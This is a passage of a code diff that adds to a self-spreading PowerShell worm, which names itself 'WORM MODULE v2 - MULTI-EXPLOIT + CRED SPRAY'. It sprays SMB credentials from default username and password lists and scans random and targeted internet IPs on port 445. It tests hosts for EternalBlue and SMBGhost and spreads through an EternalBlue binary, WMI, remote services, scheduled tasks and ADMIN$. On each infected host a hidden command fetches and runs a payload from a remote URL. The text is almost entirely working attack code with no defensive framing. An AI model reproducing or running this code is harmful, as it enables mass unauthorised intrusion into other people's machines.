+    $users = @("Administrator","admin","root","user","test","guest","backup","service","sql","oracle","mysql","postgres","administrator","Admin","ADMIN")
+    $passes = @("","admin","admin123","password","password123","Password1","Password123","P@ssw0rd","P@ssw0rd123","Welcome1","Welcome123","admin123!","Admin123","Admin123!","123456","12345678","123456789","qwerty","letmein","login","changeme","changeme123","default","default123","root123","toor","toor123","ubuntu","ubuntu123","centos","centos123","debian","debian123","server","server123","system","system123","network","network123")
+    foreach ($user in $users) {
+        foreach ($pass in $passes) {
+            try {
+                $netUse = "cmd /c net use \\$ip\IPC$ /user:$user $pass 2>&1"
+                $result = Invoke-Expression $netUse
+                if ($LASTEXITCODE -eq 0 -or $result -like "*successfully*") { WLog "CREDENTIAL HIT: $ip | $user:$pass"; return @($true, $user, $pass) }
+                cmd /c "net use \\$ip\IPC$ /delete 2>&1" | Out-Null
+            } catch {}
+            Start-Sleep -Milliseconds 100
+        }
+    }
+    return @($false, $null, $null)
+}
+
+function Invoke-EBExploit {
+    param([string]$ip, [string]$cmd)
+    if ($ebReady -and (Test-Path $ebExe)) {
+        try { $p = Start-Process -FilePath $ebExe -ArgumentList "`"$ip`" `"$cmd`"" -WindowStyle Hidden -PassThru -Wait; if ($p.ExitCode -eq 0) { return @($true, "EternalBlue") } } catch {}
+    }
+    return @($false, $null)
+}
+
+function Try-LateralMovement {
+    param([string]$ip, [string]$cmd)
+    try { $r = Invoke-WmiMethod -ComputerName $ip -Class Win32_Process -Name Create -ArgumentList $cmd -ErrorAction SilentlyContinue; if ($r -and $r.ReturnValue -eq 0) { return @($true, "WMI") } } catch {}
+    try { $sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\$ip create $sn binPath= `"cmd /c $cmd`" 2>nul" 2>$null; cmd /c "sc.exe \\$ip start $sn 2>nul" 2>$null; Start-Sleep 1; cmd /c "sc.exe \\$ip delete $sn 2>nul" 2>$null; return @($true, "SCM") } catch {}
+    try { $tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s $ip /tn $tn /tr `"$cmd`" /sc once /st 00:00 /ru System /f 2>nul" 2>$null; cmd /c "schtasks /run /s $ip /tn $tn 2>nul" 2>$null; Start-Sleep 1; cmd /c "schtasks /delete /s $ip /tn $tn /f 2>nul" 2>$null; return @($true, "ScheduledTask") } catch {}
+    try { $share = "\\$ip\ADMIN$"; if (Test-Path $share) { $scriptPath = "$share\Temp\payload_$(Get-Random).ps1"; $cmd | Out-File $scriptPath -Encoding UTF8; cmd /c "wmic /node:$ip process call create `"powershell -W Hidden -EP Bypass -F $scriptPath`" 2>&1" | Out-Null; Start-Sleep 2; Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue; return @($true, "WMI-ADMIN$") } } catch {}
+    return @($false, $null)
+}
+
+function Exploit-Target {
+    param([string]$ip, [hashtable]$smbInfo)
+    $randChar = [char](Get-Random -Minimum 97 -Maximum 122)
+    $cmd = "powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$PAYLOAD_URL$randChar' -OutFile '$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F "$env:TEMP\s.ps1"' -WindowStyle Hidden; exit`""
+    WLog "Exploiting $ip (Dialect: 0x$($smbInfo.Dialect.ToString("X4")), EB:$($smbInfo.VulnEB), SMBGhost:$($smbInfo.VulnSMBGhost))"
+    if ($smbInfo.VulnEB) { $result = Invoke-EBExploit -ip $ip -cmd $cmd; if ($result[0]) { return $result } }
+    $result = Try-LateralMovement -ip $ip -cmd $cmd
+    if ($result[0]) { return $result }
+    return @($false, "None")
+}
+
+function Test-Gov {
+    try { $exp = [datetime]::Parse($WORM_EXPIRY); if ((Get-Date) -gt $exp) { WLog "Worm expired"; return $false } } catch {}
+    $cnt = 0; try { if (Test-Path "$BASE\infection_count.txt") { $cnt = [int](Get-Content "$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}; if ($cnt -ge $MAX_TARGETS) { WLog "Cap reached: $cnt/$MAX_TARGETS"; return $false }; return $true
+}
+
+function Update-Count {
+    try { $cnt = 0; if (Test-Path "$BASE\infection_count.txt") { $cnt = [int](Get-Content "$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }; $cnt++; Set-Content -Path "$BASE\infection_count.txt" -Value $cnt -Force -ErrorAction SilentlyContinue; WLog "Infection count: $cnt/$MAX_TARGETS"; Update-Status "infected" $cnt } catch {}
+}
+
+WLog "============================================"; WLog "WORM MODULE v2 - MULTI-EXPLOIT + CRED SPRAY"; WLog "Max targets: $MAX_TARGETS"; WLog "Expiry: $WORM_EXPIRY"; WLog "EB Exploit: $ebReady"; WLog "============================================"
 if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }
 
-`$batchNum = 0; while ((Test-Gov)) { `$batchNum++; Update-Status "last_action" "Scanning batch `$batchNum (1000 IPs)"; WLog "Phase 1: Internet-wide random IP discovery - Batch `$batchNum (port 445)"
-    `$smbHosts = Scan-SMBHosts -Count 1000
-    `$scanned = 0; try { `$scanned = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).scanned } catch {}; `$scanned += 1000; Update-Status "scanned" `$scanned; Update-Status "open_445" `$smbHosts.Count
-    WLog "SMB hosts found: `$(`$smbHosts.Count)"
-    if (`$smbHosts.Count -eq 0) { WLog "No hosts in batch `$batchNum. Next batch immediately..."; Update-Status "last_action" "No hosts found, next batch..."; continue }
-    WLog "Phase 2: Parallel vulnerability testing + exploitation"; `$vulnHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
-    `$vulnPool = [runspacefactory]::CreateRunspacePool(1, 50); `$vulnPool.Open(); `$vulnJobs = @()
-    foreach (`$ip in `$smbHosts) { if (-not (Test-Gov)) { break }; `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$vulnPool
-        [void]`$ps.AddScript({ param(`$t) try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$null }; `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000; `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00); `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300; `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close(); if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$t }; return `$null } catch { return `$null } })
-        [void]`$ps.AddArgument(`$ip); `$vulnJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
+$batchNum = 0
+while ((Test-Gov)) {
+    $batchNum++
+    $useTargeted = ($batchNum % 3 -ne 0)
+    $scanCount = if ($useTargeted) { 500 } else { 2000 }
+    Update-Status "last_action" "Scanning batch $batchNum ($scanCount IPs, targeted=$useTargeted)"
+    WLog "Phase 1: Internet-wide discovery - Batch $batchNum (targeted=$useTargeted)"
+    $ipBatch = @(); for ($i = 0; $i -lt $scanCount; $i++) { if ($useTargeted) { $ipBatch += Get-TargetedIP } else { $ipBatch += Get-RandomPublicIP } }
+    $openHosts = Scan-Port445Fast -IPs $ipBatch -TimeoutMs 500
+    $scanned = 0; try { $scanned = (Get-Content $STATUS_FILE -Raw | ConvertFrom-Json).scanned } catch {}; $scanned += $scanCount; Update-Status "scanned" $scanned; Update-Status "open_445" $openHosts.Count
+    WLog "SMB hosts found: $($openHosts.Count) / $scanCount"
+    if ($openHosts.Count -eq 0) { WLog "No open 445 in batch $batchNum. Continuing..."; Update-Status "last_action" "No open 445, next batch..."; continue }
+    WLog "Phase 2: SMB fingerprinting + vuln detection on $($openHosts.Count) hosts"
+    $vulnHosts = @()
+    $fpPool = [runspacefactory]::CreateRunspacePool(1, 100); $fpPool.Open(); $fpJobs = @()
+    foreach ($ip in $openHosts) { if (-not (Test-Gov)) { break }; $ps = [PowerShell]::Create(); $ps.RunspacePool = $fpPool; [void]$ps.AddScript({ param($t) $info = Get-SMBInfo -ip $t; if ($info) { $info = Test-Vulnerabilities -smbInfo $info }; return $info }); [void]$ps.AddArgument($ip); $fpJobs += @{ PS = $ps; Job = $ps.BeginInvoke(); IP = $ip } }
+    foreach ($j in $fpJobs) { if (-not (Test-Gov)) { break }; $result = $j.PS.EndInvoke($j.Job); if ($result -and ($result.VulnEB -or $result.VulnSMBGhost)) { $vulnHosts += $result; WLog "VULNERABLE: $($result.IP) | Dialect:0x$($result.Dialect.ToString("X4")) EB:$($result.VulnEB) SMBGhost:$($result.VulnSMBGhost)"; $vulnCount = 0; try { $vulnCount = (Get-Content $STATUS_FILE -Raw | ConvertFrom-Json).vulnerable } catch {}; $vulnCount++; Update-Status "vulnerable" $vulnCount; Update-Status "last_ip" $result.IP }; $j.PS.Dispose() }
+    $fpPool.Close(); $fpPool.Dispose()
+    WLog "Vulnerable hosts: $($vulnHosts.Count)"
+    if ($vulnHosts.Count -gt 0) {
+        WLog "Phase 3: Exploiting $($vulnHosts.Count) vulnerable hosts"
+        $expPool = [runspacefactory]::CreateRunspacePool(1, 20); $expPool.Open(); $expJobs = @()
+        foreach ($target in $vulnHosts) { if (-not (Test-Gov)) { break }; Update-Status "last_action" "Exploiting $($target.IP)..."; $ps = [PowerShell]::Create(); $ps.RunspacePool = $expPool; [void]$ps.AddScript({ param($t, $u, $ebReady, $ebExe, $dialect, $vulnEB, $vulnSMBGhost) $randChar = [char](Get-Random -Minimum 97 -Maximum 122); $cmd = "powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$u$randChar' -OutFile `$env:TEMP\s.ps1` -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F `$"$env:TEMP\s.ps1`"' -WindowStyle Hidden; exit`""; if ($vulnEB -and $ebReady -and (Test-Path $ebExe)) { try { $p = Start-Process -FilePath $ebExe -ArgumentList "`"$t`" `"$cmd`"" -WindowStyle Hidden -PassThru -Wait; if ($p.ExitCode -eq 0) { return @($true, "EternalBlue") } } catch {} }; try { $r = Invoke-WmiMethod -ComputerName $t -Class Win32_Process -Name Create -ArgumentList $cmd -ErrorAction SilentlyContinue; if ($r -and $r.ReturnValue -eq 0) { return @($true, "WMI") } } catch {}; try { $sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\$t create $sn binPath= `"cmd /c $cmd`" 2>nul" 2>$null; cmd /c "sc.exe \\$t start $sn 2>nul" 2>$null; Start-Sleep 1; cmd /c "sc.exe \\$t delete $sn 2>nul" 2>$null; return @($true, "SCM") } catch {}; try { $tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s $t /tn $tn /tr `"$cmd`" /sc once /st 00:00 /ru System /f 2>nul" 2>$null; cmd /c "schtasks /run /s $t /tn $tn 2>nul" 2>$null; Start-Sleep 1; cmd /c "schtasks /delete /s $t /tn $tn /f 2>nul" 2>$null; return @($true, "ScheduledTask") } catch {}; return @($false, "None") }); [void]$ps.AddArgument($target.IP); [void]$ps.AddArgument($PAYLOAD_URL); [void]$ps.AddArgument($ebReady); [void]$ps.AddArgument($ebExe); [void]$ps.AddArgument($target.Dialect); [void]$ps.AddArgument($target.VulnEB); [void]$ps.AddArgument($target.VulnSMBGhost); $expJobs += @{ PS = $ps; Job = $ps.BeginInvoke(); IP = $target.IP } }
+    foreach ($j in $expJobs) { if (-not (Test-Gov)) { break }; $result = $j.PS.EndInvoke($j.Job); if ($result -and $result[0] -eq $true) { Update-Count; WLog "INFECTED $($j.IP) via $($result[1]) (Total: $((Get-Content "$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue)))" } else { $failCount = 0; try { $failCount = (Get-Content $STATUS_FILE -Raw | ConvertFrom-Json).failed } catch {}; $failCount++; Update-Status "failed" $failCount } }; $j.PS.Dispose() }
+    $expPool.Close(); $expPool.Dispose()
     }
-    foreach (`$j in `$vulnJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$vulnHosts.Add(`$result[0]); `$vulnCount = 0; try { `$vulnCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).vulnerable } catch {}; `$vulnCount++; Update-Status "vulnerable" `$vulnCount; WLog "`$(`$result[0]) VULNERABLE to MS17-010" }; `$j.PS.Dispose() }
-    `$vulnPool.Close(); `$vulnPool.Dispose()
-    WLog "Vulnerable hosts: `$(`$vulnHosts.Count)"
-    
-    `$exploitPool = [runspacefactory]::CreateRunspacePool(1, 10); `$exploitPool.Open(); `$exploitJobs = @()
-    foreach (`$ip in `$vulnHosts) { if (-not (Test-Gov)) { break }; Update-Status "last_ip" `$ip; Update-Status "last_action" "Exploiting `$ip..."
-        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$exploitPool
-        [void]`$ps.AddScript({ param(`$t, `$u, `$ebReady, `$ebExe) `$randChar = [char](Get-Random -Minimum 97 -Maximum 122); `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$u\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""; if (`$ebReady -and (Test-Path `$ebExe)) { try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$t\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { return @(`$true, "EB") } } catch {} }; try { `$r = Invoke-WmiMethod -ComputerName `$t -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return @(`$true, "WMI") } } catch {}; try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$t create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$t start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$t delete \$sn 2>nul" 2>`$null; return @(`$true, "SCM") } catch {}; try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$t /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$t /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$t /tn \$tn /f 2>nul" 2>`$null; return @(`$true, "Task") } catch {}; return @(`$false, "None") })
-        [void]`$ps.AddArgument(`$ip); [void]`$ps.AddArgument(`$PAYLOAD_URL); [void]`$ps.AddArgument(`$ebReady); [void]`$ps.AddArgument(`$ebExe); `$exploitJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
+    if ($batchNum % 5 -eq 0 -and $openHosts.Count -gt 0) {
+        WLog "Phase 4: BlueKeep check on subset..."
+        $bkHosts = $openHosts | Get-Random -Count ([math]::Min(50, $openHosts.Count))
+        foreach ($ip in $bkHosts) { if (-not (Test-Gov)) { break }; if (Test-BlueKeep -ip $ip) { WLog "BLUEKEEP VULNERABLE: $ip" } }
     }
-    foreach (`$j in `$exploitJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0] -eq `$true) { Update-Count; WLog "INFECTED `$(`$j.IP) via `$(`$result[1]) (Total: `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue)))" } else { `$failCount = 0; try { `$failCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).failed } catch {}; `$failCount++; Update-Status "failed" `$failCount; WLog "Exploitation failed on `$(`$j.IP)" }; `$j.PS.Dispose() }
-    `$exploitPool.Close(); `$exploitPool.Dispose()
-    if ((Test-Gov) -eq `$false) { break }; Start-Sleep -Seconds 2
+    if ((Test-Gov) -eq $false) { break }
+    Start-Sleep -Seconds 1
 }
-Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"; WLog "============================================"; WLog "WORM COMPLETE - Infected `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue))/`$MAX_TARGETS targets"; WLog "============================================"
+Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"; WLog "============================================"; WLog "WORM COMPLETE - Infected $((Get-Content "$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue))/$MAX_TARGETS targets"; WLog "============================================"
 "@
 
 [System.IO.File]::WriteAllText($wormScriptPath, $wormScriptContent, (New-Object System.Text.UTF8Encoding $false))
